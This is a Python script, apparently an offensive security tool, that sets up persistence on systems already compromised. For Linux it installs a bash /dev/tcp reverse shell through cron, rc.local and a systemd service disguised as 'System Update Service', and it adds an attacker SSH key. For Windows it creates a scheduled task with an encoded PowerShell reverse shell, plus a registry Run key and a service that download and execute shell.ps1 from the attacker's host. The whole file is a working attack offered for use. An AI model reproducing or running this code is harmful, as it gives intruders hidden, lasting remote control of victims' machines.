```python
#!/usr/bin/env python3
"""
persistence.py - Create persistence on compromised systems
Usage: python3 persistence.py -t TARGET -u USER -p PASS --lhost YOUR_IP --lport PORT --os linux
"""

import argparse
import subprocess
import base64
import os

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
B = '\033[1m'
X = '\033[0m'

class Persistence:
    def __init__(self, target, username, password, lhost, lport):
        self.target = target
        self.username = username
        self.password = password
        self.lhost = lhost
        self.lport = lport
        self.reverse_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        
    def linux_cron_persistence(self):
        print(f"{C}[*] Adding cron job persistence...{X}")
        
        cron_line = f"*/5 * * * * {self.reverse_shell}\n"
        cron_cmd = f"echo '{cron_line}' | crontab -"
        
        cmd = f"sshpass -p '{self.password}' ssh -o StrictHostKeyChecking=no {self.username}@{self.target} '{cron_cmd}'"
        subprocess.run(cmd, shell=True)
        
        print(f"{G}[+] Cron persistence added (runs every 5 minutes){X}")
    
    def linux_ssh_persistence(self):
        print(f"{C}[*] Adding SSH key persistence...{X}")
        
        if not os.path.exists("/tmp/oscp_key"):
            subprocess.run("ssh-keygen -t rsa -b 4096 -f /tmp/oscp_key -N ''", shell=True)
        
        with open("/tmp/oscp_key.pub") as f:
            pub_key = f.read()
        
        ssh_cmd = f"echo '{pub_key}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
        cmd = f"sshpass -p '{self.password}' ssh -o StrictHostKeyChecking=no {self.username}@{self.target} '{ssh_cmd}'"
        subprocess.run(cmd, shell=True)
        
        print(f"{G}[+] SSH key added to authorized_keys{X}")
        print(f"{Y}[!] Connect with: ssh -i /tmp/oscp_key {self.username}@{self.target}{X}")
    
    def linux_rc_local_persistence(self):
        print(f"{C}[*] Adding rc.local persistence...{X}")
        
        rc_cmd = f"echo '{self.reverse_shell}' >> /etc/rc.local"
        cmd = f"sshpass -p '{self.password}' ssh -o StrictHostKeyChecking=no {self.username}@{self.target} 'sudo {rc_cmd}'"
        subprocess.run(cmd, shell=True)
        
        print(f"{G}[+] Added to rc.local (runs on boot){X}")
    
    def linux_systemd_persistence(self):
        print(f"{C}[*] Creating systemd service...{X}")
        
        service = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '{self.reverse_shell}'
Restart=always
User=root

[Install]
WantedBy=multi-user.target
"""
        
        b64_service = base64.b64encode(service.encode()).decode()
        cmd = f"echo '{b64_service}' | base64 -d | sudo tee /etc/systemd/system/update.service && sudo systemctl enable update.service && sudo systemctl start update.service"
        
        ssh_cmd = f"sshpass -p '{self.password}' ssh -o StrictHostKeyChecking=no {self.username}@{self.target} '{cmd}'"
        subprocess.run(ssh_cmd, shell=True)
        
        print(f"{G}[+] Systemd service created and enabled{X}")
    
    def windows_schtask_persistence(self):
        print(f"{C}[*] Creating scheduled task...{X}")
        
        ps_shell = f"""$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()"""
        
        b64_shell = base64.b64encode(ps_shell.encode('utf_16_le')).decode()
        
        task_cmd = f'powershell -Command "schtasks /create /tn "SystemUpdate" /tr "powershell -EncodedCommand {b64_shell}" /sc daily /st 09:00 /f"'
        
        cmd = f"evil-winrm -i {self.target} -u {self.username} -p '{self.password}' -c '{task_cmd}'"
        subprocess.run(cmd, shell=True)
        
        print(f"{G}[+] Scheduled task created{X}")
    
    def windows_registry_persistence(self):
        print(f"{C}[*] Adding registry persistence...{X}")
        
        reg_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "powershell -c IEX(IWR http://{self.lhost}/shell.ps1)" /f'
        
        cmd = f"evil-winrm -i {self.target} -u {self.username} -p '{self.password}' -c '{reg_cmd}'"
        subprocess.run(cmd, shell=True)
        
        print(f"{G}[+] Registry run key added{X}")
    
    def windows_service_persistence(self):
        print(f"{C}[*] Creating Windows service...{X}")
        
        service_cmd = f'sc create "SystemUpdate" binPath= "cmd.exe /c powershell -c IEX(IWR http://{self.lhost}/shell.ps1)" start= auto'
        
        cmd = f"evil-winrm -i {self.target} -u {self.username} -p '{self.password}' -c '{service_cmd}'"
        subprocess.run(cmd, shell=True)
        
        print(f"{G}[+] Windows service created{X}")

def main():
    ap = argparse.ArgumentParser(description="Create Persistence on Compromised Systems")
    ap.add_argument("-t", "--target", required=True)
    ap.add_argument("-u", "--username", required=True)
    ap.add_argument("-p", "--password", required=True)
    ap.add_argument("--lhost", required=True, help="Your listener IP")
    ap.add_argument("--lport", required=True, type=int, help="Your listener port")
    ap.add_argument("--method", choices=["cron", "ssh", "rc", "systemd", "schtask", "registry", "service", "all"], default="all")
    ap.add_argument("--os", choices=["linux", "windows"], required=True)
    args = ap.parse_args()
    
    pers = Persistence(args.target, args.username, args.password, args.lhost, args.lport)
    
    print(f"{B}{C}=== Persistence Setup for {args.target} ==={X}\n")
    
    if args.os == "linux":
        if args.method in ["cron", "all"]:
            pers.linux_cron_persistence()
        if args.method in ["ssh", "all"]:
            pers.linux_ssh_persistence()
        if args.method in ["rc", "all"]:
            pers.linux_rc_local_persistence()
        if args.method in ["systemd", "all"]:
            pers.linux_systemd_persistence()
    
    elif args.os == "windows":
        if args.method in ["schtask", "all"]:
            pers.windows_schtask_persistence()
        if args.method in ["registry", "all"]:
            pers.windows_registry_persistence()
        if args.method in ["service", "all"]:
            pers.windows_service_persistence()
    
    print(f"\n{G}[+] Persistence methods deployed!{X}")
    print(f"{Y}[!] Start listener: nc -lvnp {args.lport}{X}")

if __name__ == "__main__":
    main()
```